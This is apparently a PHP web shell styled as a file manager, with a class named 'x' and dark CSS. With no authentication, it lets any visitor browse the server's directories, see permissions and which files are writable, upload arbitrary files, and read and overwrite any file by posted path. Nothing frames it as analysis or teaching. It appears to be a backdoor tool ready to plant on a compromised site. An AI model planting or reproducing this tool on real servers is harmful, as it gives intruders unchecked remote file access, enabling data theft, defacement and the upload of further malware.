<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
	body {
		background: #171717;
		color: #d4d4d4;
		font-family: 'Pangolin', cursive;
	}
	a {
		font-family: 'Pangolin', cursive;
		text-decoration: none;
		color: #d4d4d4;
	}
	table {
		border-radius:10px;
		padding: 20px;
		width:70%;
		background: #242424;
	}
	textarea {
		width:100%;
		font-family: 'Pangolin', cursive;
		height:350px;
		border-radius:4px;
		color: #d4d4d4;
		resize: none;
		outline: none;
		padding:15px;
		border:2px solid #d4d4d4;
		background: transparent;
	}
	::-webkit-scrollbar {
    	width: 0px;
    	background: transparent;
	}
	::-webkit-scrollbar-thumb {
    	background: transparent;
	}
	select.select {
		background: #242424;
		padding:0;
	}
	select {
		background: #242424;
		padding:5px;
		border-radius:3px;
		width:100%;
		font-family: 'Pangolin', cursive;
		border:2px solid #d4d4d4;
		color: #d4d4d4;
		resize: none;
	}
	input[type=submit] {
		padding:5px;
		font-family: 'Pangolin', cursive;
		border-radius:4px;
		background: none;
		border:2px solid #d4d4d4;
		color: #d4d4d4;
		outline: none;
		width:100%;
	}
	td {
		padding:3px;
	}
	td.files {
		max-width:70%;
	}
	td.form {
		width:10px;
		text-align: center;
	}
	td.action {
		width:100px;
	}
	td.tt {
		width:1px;
	}
	td.header {
		padding:5px;
		text-align: center;
		font-size:25px;
		font-weight: bold;
	}
	td.select {
		width:70px;
	}
	.icon {
		width:25px;
		height:25px;
	}
	.container {
  		display: block;
  		position: relative;
  		padding-left: 15px;
  		margin-bottom: 19px;
  		cursor: pointer;
  		-webkit-user-select: none;
  		-moz-user-select: none;
  		-ms-user-select: none;
  		user-select: none;
	}

	.container input {
  		position: absolute;
  		opacity: 0;
  		cursor: pointer;
  		height: 0;
  		width: 0;
	}

	.checkmark {
  		position: absolute;
  		top: 0;
  		left: 0;
  		height: 18px;
  		width: 18px;
  		border-radius:10px;
  		background-color: #d4d4d4;
	}
	.container:hover input ~ .checkmark {
  		background-color: #ccc;
	}
	.container input:checked ~ .checkmark {
  		background-color: #2196F3;
	}
	.checkmark:after {
  		content: "";
  		position: absolute;
  		display: none;
	}
	.container input:checked ~ .checkmark:after {
  		display: block;
	}
	.container .checkmark:after {
  		left: 6px;
  		top: 2px;
  		width: 3px;
  		height: 8px;
  		border: solid white;
 		border-width: 0 3px 3px 0;
  		-webkit-transform: rotate(45deg);
  		-ms-transform: rotate(45deg);
  		transform: rotate(45deg);
	}
</style>
<table align="center">
<?php
class x {
	public function __construct(bool $debug = true, int $time = 0) {
        if ($debug === true) {
            error_reporting(E_ALL);
        } else {
            error_reporting($debug);
        }

        error_log($debug);
        set_time_limit($time);
        $this->root = $_SERVER['DOCUMENT_ROOT'];
        $this->cwd 	= $this->cwd() . DIRECTORY_SEPARATOR;
        $this->cft 	= time();
    }
    public function home() {
    	$this->home = "http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
    	if ($this->vars($this->home)) {
    		return false;
    	} else {
    		$this->vars("<script>window.location='". $this->home ."'</script>");
    	}
    }
    public function vars($x) {
    	return print($x);
    }
    public function cwd() {
    	return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
    }
    public function cd(string $directory) {
    	if (isset($directory)) {
    		$this->dir = $directory;
    		@chdir($this->dir);
    	} else {
    		$this->dir = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
    	} return $this->dir;
    }
    public function changeTime($filename) {
        if (file_exists($filename)) $this->cft = filemtime($filename);
    }
    public function perms($filename) {
    	return substr(sprintf("%o", fileperms($filename)), -4);
    }
    public function w__($filename, $perms) {
    	if (is_writable($filename)) {
    		return "<font color='green'>{$perms}</font>";
    	} else {
    		return "<font color='red'>{$perms}</font>";
    	}
    }
    public function getimg($filename) {
    	$this->extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    	switch ($this->extension) {
    		case 'php':
    			$this->vars("https://image.flaticon.com/icons/png/128/337/337947.png");
    			break;
    		
    		default:
    			$this->vars("https://image.flaticon.com/icons/svg/833/833524.svg");
    			break;
    	}
    }
    public function upload(array $file) {
    	$this->files = count($file['tmp_name']);
    	for ($i=0; $i < $this->files ; $i++) { 
    		return copy($file['tmp_name'][$i], $this->cd("") . $file['name'][$i]);
    	}
    }
    public function size($filename) {
    	if (is_file($filename)) {
    		$this->filepath = $filename;
    		if (!realpath($this->filepath)) {
    			$this->filepath = $this->root . $this->filepath;
    		}
    		$this->filesize = filesize($this->filepath);
    		$this->size 	= array("TB","GB","MB","KB","B");
    		$this->total 	= count($this->size);
    		while ($this->total-- && $this->filesize > 1024) {
    			$this->filesize /= 1024;
    		} return round($this->filesize, 2) . " " . $this->size[$this->total];
    	} return false;
    }
    public function ftime($filename) {
    	return date("F d Y g:i:s", filemtime($filename));
    }
    public function save($filename, $text, $mode = "w") {
    	if (substr($this->cwd, -1) === DIRECTORY_SEPARATOR) {
    		$this->changeTime($this->cwd . $filename);
    		$this->handle = fopen($filename, $mode);
    		fwrite($this->handle, $text);
    		fclose($this->handle);
    	} else {
    		$this->changeTime($this->cwd . DIRECTORY_SEPARATOR . $filename);
    		$this->handle = fopen($filename, $mode);
    		fwrite($this->handle, $text);
    		fclose($this->handle);
    	}
    }
}

$x = new x();

if (isset($_GET['cd'])) {
	$x->cd($_GET['cd']);
}

switch (@$_POST['tools']) {
	case 'upload':
		if (isset($_POST['submit'])) {
			if ($x->upload($_FILES['file'])) {
				$x->vars("success");
			} else {
				$x->vars("failed");
			}
		}
		?>
		<form method="post" enctype="multipart/form-data">
			<tr>
				<td>
					<input type="file" name="file[]" multiple>
				</td>
				<td>
					<input type="submit" name="submit">
					<input type="hidden" name="tools" value="upload">
				</td>
			</tr>
		</form>
		<?php
		exit();
		break;
	
	default:
		# code...
		break;
}

switch (@$_POST['act']) {
	case 'edit':
		if (isset($_POST['submit'])) {
			if ($x->save($_POST['file'], $_POST['text'])) {
				echo "failed";
			} else {
				echo "success";
			}
		}
		?>
		<tr>
			<td class="action">
				<a href="?cd=<?= getcwd() ?>">
					<img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icon">
				</a>
			</td>
			<td colspan="2" class="header">
				EDIT
			</td>
		</tr>
		<tr>
			<td class="action">
				Filename
			</td>
			<td class="tt"><center>:</center></td>
			<td>
				<?= basename($_POST['file']) ?>
			</td>
		</tr>
		<tr>
			<td class="action">
				Size
			</td>
			<td class="tt"><center>:</center></td>
			<td>
				<?= $x->size($_POST['file']) ?>
			</td>
		</tr>
		<tr>
			<td class="action">
				Last update
			</td>
			<td class="tt"><center>:</center></td>
			<td>
				<?= $x->ftime($_POST['file']) ?>
			</td>
		</tr>
		<tr>
			<td colspan="3">
				<select name="act" onchange="if(this.value != '0') this.form.submit()" >
					<option value="edit" selected>EDIT</option>
				</select>
			</td>
		</tr>
		<form method="post">
			<tr>
				<td colspan="3">
					<textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
				</td>
			</tr>
			<tr>
				<td colspan="3">
					<input type="submit" name="submit">
					<input type="hidden" name="act" value="edit">
					<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
				</td>
			</tr>
		</form>
		<?php
		exit();
		break;
}

foreach (scandir(getcwd()) as $key => $value) {
	if (!is_dir($value) || $value === '.') continue;
		if ($value === '..') {
			?>
			<tr>
				<td class="form" colspan="2">
					<a href="?cd=<?= dirname(getcwd()) ?>">
						<img src="https://dailycliparts.com/wp-content/uploads/2019/01/Left-Side-Thick-Size-Arrow-Picture-300x259.png" class="icon">
					</a>
				</td>
				<form method="post" action="?cd=<?= getcwd() ?>">
					<td colspan="4" class="header">
						<a href="<?= $x->home() ?>">HOME</a>
						<button name="tools" value="upload">UPLOAD</button>
					</td>
				</form>
			</tr>
			<tr>
				<td colspan="6"></td>
			</tr>
			<?php
		} else {
			?>
			<tr>
				<td class="form">
					<label class='container'>
						<input type="checkbox" name="value[]" form="myform" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
						<span class='checkmark'></span>
					</label>
				</td>
				<td class="form">
					<img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
				</td>
				<td class="files">
					<a href="?cd=<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>"><?= $value ?></a>
				</td>
				<td>
					<center>
						<?= @filetype($value) ?>
					</center>
				</td>
				<td>
					<center>
						<?= $x->w__($value, $x->perms($value)) ?>
					</center>
				</td>
				<form method="post">
					<td class="select">
						<select class="select" name="act" onchange="if(this.value != '0') this.form.submit()">
							<option selected>ACTION</option>
						</select>
						<input type="hidden" name="file" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
					</td>
				</form>
			</tr>
			<?php
		}
}
foreach (scandir(getcwd()) as $key => $value) {
	if (!is_file($value)) continue;
		?>
		<tr>
			<td class="form">
				<label class='container'>
					<input type="checkbox" name="value[]" form="myform" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
					<span class='checkmark'></span>
				</label>
			</td>
			<td class="form">
				<img class="icon" src="<?= $x->getimg($value) ?>">
			</td>
			<td class="files">
				<?= $value ?>
			</td>
			<td>
				<center>
					<?= $x->size($value) ?>
				</center>
			</td>
			<td>
				<center>
					<?= $x->w__($value, $x->perms($value)) ?>
				</center>
			</td>
			<form method="post">
				<td class="select">
					<select class="select" name="act" onchange="if(this.value != '0') this.form.submit()">
						<option selected>ACTION</option>
						<option value="edit">EDIT</option>
					</select>
					<input type="hidden" name="file" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
				</td>
			</form>
		</tr>
		<?php
}
?>
<tr>
	<td class="form">
		<label class='container'>
			<input onclick="checkAll(this)" type="checkbox">
			<span class='checkmark'></span>
		</label>
	</td>
	<form method="post" id="myform">
		<td colspan="5">
			<select name="mode" onchange="if(this.value != '0') this.form.submit()">
				<option selected>ACTION</option>
				<option value="delete">DELETE</option>
			</select>
		</td>
	</form>
</tr>
<?php
if (!empty($data = @$_POST['value'])) {
	foreach ($data as $key => $value) {
		switch (@$_POST['mode']) {
			case 'delete':
				print($value);
				break;
			
			default:
				# code...
				break;
		}
	}
}
?>
<script type="text/javascript">
	function checkAll(ele) {
		var checkboxes = document.getElementsByTagName('input');
		if (ele.checked) {
			for (var i = 0; i < checkboxes.length; i++) {
				if (checkboxes[i].type == 'checkbox' ) {
					checkboxes[i].checked = true;
				}
           	}
       	} else {
           	for (var i = 0; i < checkboxes.length; i++) {
               	if (checkboxes[i].type == 'checkbox') {
                   	checkboxes[i].checked = false;
               	}
           	}
       	}
   	}
</script>
</table>
